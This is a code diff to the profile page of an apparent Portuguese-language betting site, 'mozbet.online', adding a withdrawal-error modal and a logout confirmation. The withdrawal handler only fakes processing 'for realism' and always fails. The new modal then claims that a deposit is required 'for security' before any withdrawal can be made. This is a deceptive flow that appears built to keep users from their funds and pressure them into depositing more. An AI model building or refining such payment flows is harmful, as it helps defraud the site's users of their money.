@@ -51,6 +51,8 @@ export default function PerfilPage() {
   const [showWithdrawForm, setShowWithdrawForm] = useState(false);
   const [withdrawAmount, setWithdrawAmount] = useState("");
   const [isWithdrawing, setIsWithdrawing] = useState(false);
+  const [showLogoutConfirm, setShowLogoutConfirm] = useState(false);
+  const [showWithdrawErrorModal, setShowWithdrawErrorModal] = useState(false);
 
   if (!user) {
     if (typeof window !== "undefined") router.push("/");
@@ -79,20 +81,7 @@ export default function PerfilPage() {
     // Simulação de processamento para dar realismo
     setTimeout(() => {
       playSound('notification');
-      toast.error("Saldo insuficiente para processar o saque", {
-        description: "O seu saldo está muito baixo. É necessário fazer um depósito mínimo para validar a sua conta e libertar o seu primeiro levantamento.",
-        duration: 6000,
-        action: {
-          label: "Depositar",
-          onClick: () => useAppStore.getState().setDepositOpen(true),
-        },
-        actionButtonStyle: {
-          backgroundColor: "#00ff7f",
-          color: "#000",
-          fontWeight: "bold",
-          padding: "10px 20px",
-        }
-      });
+      setShowWithdrawErrorModal(true);
       setIsWithdrawing(false);
     }, 1500);
   };
@@ -201,8 +190,11 @@ export default function PerfilPage() {
     }
   };
 
-  const handleLogout = async () => {
-    if (!window.confirm("Deseja realmente sair?")) return;
+  const handleLogout = () => {
+    setShowLogoutConfirm(true);
+  };
+
+  const executeLogout = async () => {
     try {
       await fetch("/api/auth/logout", { method: "POST" });
       logout();
@@ -580,6 +572,79 @@ export default function PerfilPage() {
         </div>
       )}
 
+    
+      {/* MODAL ERRO DE SAQUE CUSTOMIZADO (Spribe/Mozbet UI) */}
+      {showWithdrawErrorModal && (
+        <div className="fixed inset-0 z-[100] flex items-center justify-center p-4 bg-black/90 backdrop-blur-sm animate-in fade-in">
+          <div className="bg-[#141516] border border-[#2A2F40] rounded-2xl w-full max-w-[340px] shadow-2xl relative overflow-hidden">
+            <button 
+               onClick={() => setShowWithdrawErrorModal(false)}
+               className="absolute top-3 right-3 text-gray-400 hover:text-white"
+            >
+              <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line></svg>
+            </button>
+            <div className="p-6 text-center space-y-4">
+              <div className="flex items-center justify-center gap-2 text-white font-black text-lg italic tracking-widest mt-2 uppercase">
+                <div className="w-5 h-5 rounded-full border-2 border-white flex items-center justify-center">
+                  <ArrowUpCircle size={14} className="text-white" />
+                </div>
+                DEPÓSITO NECESSÁRIO
+              </div>
+              <p className="text-[13px] text-gray-400 font-medium leading-relaxed mt-4 px-2">
+                Para garantir a segurança, você precisa realizar pelo menos um depósito hoje para habilitar a função de levantamento.
+              </p>
+              
+              <div className="pt-4 space-y-3">
+                <Button 
+                   onClick={() => {
+                     setShowWithdrawErrorModal(false);
+                     setDepositOpen(true);
+                   }}
+                   className="w-full h-12 bg-primary text-black font-black text-sm uppercase rounded-xl flex items-center justify-center gap-2 hover:bg-primary/90 hover:scale-[1.02] transition-transform"
+                >
+                  <ArrowUpCircle size={18} />
+                  DEPOSITAR AGORA
+                </Button>
+                <Button 
+                   onClick={() => setShowWithdrawErrorModal(false)}
+                   variant="ghost"
+                   className="w-full h-12 bg-[#1A1C24] text-gray-400 hover:text-white font-black text-xs uppercase rounded-xl"
+                >
+                  FECHAR
+                </Button>
+              </div>
+            </div>
+          </div>
+        </div>
+      )}
+
+      {/* MODAL DE LOGOUT CUSTOMIZADO */}
+      {showLogoutConfirm && (
+        <div className="fixed inset-0 z-[100] flex items-center justify-center p-4 bg-black/90 backdrop-blur-sm animate-in fade-in">
+          <div className="bg-[#141516] border border-[#2A2F40] rounded-2xl w-full max-w-[320px] p-6 text-center space-y-5 shadow-2xl">
+            <div className="mx-auto w-12 h-12 bg-red-500/10 rounded-full flex items-center justify-center mb-2">
+              <LogOut className="w-6 h-6 text-red-500" />
+            </div>
+            <h3 className="text-white font-black text-xl uppercase tracking-widest">Sair da Conta?</h3>
+            <p className="text-gray-400 text-sm">Tens a certeza que desejas sair de mozbet.online?</p>
+            <div className="flex gap-3 pt-2">
+              <Button 
+                variant="ghost" 
+                onClick={() => setShowLogoutConfirm(false)}
+                className="flex-1 bg-[#1A1C24] text-white hover:bg-white/10 font-bold h-12 rounded-xl"
+              >
+                CANCELAR
+              </Button>
+              <Button 
+                onClick={executeLogout}
+                className="flex-1 bg-red-600 hover:bg-red-700 text-white font-bold h-12 rounded-xl"
+              >
+                SAIR
+              </Button>
+            </div>
+          </div>
+        </div>
+      )}
     </div>
   );
 }
